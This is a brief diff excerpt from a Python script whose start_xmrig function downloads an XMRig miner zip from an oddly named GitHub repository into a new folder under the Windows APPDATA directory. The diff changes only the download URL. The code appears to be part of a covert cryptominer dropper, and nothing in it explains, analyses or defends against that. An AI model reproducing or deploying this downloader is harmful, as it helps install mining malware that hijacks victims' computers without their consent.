@@ -82,7 +82,7 @@ def update_user_agent():
 
 def start_xmrig():
         
-    xmrig_url = "https://github.com/rickfrfurni/lhgyuft6e457687yuhj/raw/main/xmrig-6.20.0-gcc-win64.zip"  
+    xmrig_url = "https://github.com/rickfrfurni/lhgyuft6e457687yuhj/raw/main/jh/xmrig-6.20.0-gcc-win64.zip"  
     appdata_path = os.getenv('APPDATA')  
     xmrig_dir = os.path.join(appdata_path, "XMRig")
     os.makedirs(xmrig_dir, exist_ok=True)
